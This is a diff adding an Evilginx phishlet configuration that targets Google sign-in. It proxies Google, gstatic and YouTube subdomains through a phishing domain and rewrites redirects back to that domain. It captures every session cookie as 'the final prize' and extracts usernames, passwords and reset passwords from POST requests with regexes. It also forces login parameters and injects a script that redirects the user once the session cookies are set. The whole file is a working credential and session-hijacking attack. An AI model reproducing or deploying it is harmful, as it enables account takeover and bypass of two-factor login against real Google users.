@@ -1,0 +1,126 @@
+author: '@uk'
+min_ver: '2.3.0'
+
+# Subdomains that Evilginx will proxy
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true  , is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+
+# Match replace rules, mostly to detect unwanted redirections to legitimate site and replacing the redirect urls with our Evilginx url
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'application/xml']}
+
+# What cookies to steal from responses, i.e, the final prize.
+# we just capture ALL using [".*,regexp"]
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
+  - domain: 'mail.google.com'
+    keys: [".*,regexp"]
+
+# Regexes to capture username/password pairs
+
+
+# If user reached these endpoints, capturing is finalized (hopefully with a success)
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    # Updated_Password after password reset
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]'
+      type: 'post'
+
+# Legitimate site login page location
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+# JavaScript to be injected to proxied pages, for example, to bypass client side protection attempts
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/' , '/changepassword', '/signin']
+    script: |
+        //----------------Redirection on success login--------------------
+        var redirectCount = 0;
+        var maxRedirects = 3;
+        //var targetDomain = '{redirect-url}';
+        var targetDomain = 'https://myaccount.google.com'; // Update with the target domain
+        function checkCookies() {
+            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+                if (window.location.hostname !== targetDomain) {
+                    window.location.href = targetDomain;
+                } else {
+                    cancelAnimationFrame(animationId);
+                }
+            } else {
+                redirectCount++;
+                if (redirectCount >= maxRedirects) {
+                    cancelAnimationFrame(animationId);
+                }
+            }
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            // Call the checkCookies function at the start
+            checkCookies();
+            // Continue to call checkCookies before each repaint
+            animationId = requestAnimationFrame(function repeat() {
+                checkCookies();
+                animationId = requestAnimationFrame(repeat);
+            });
+        });
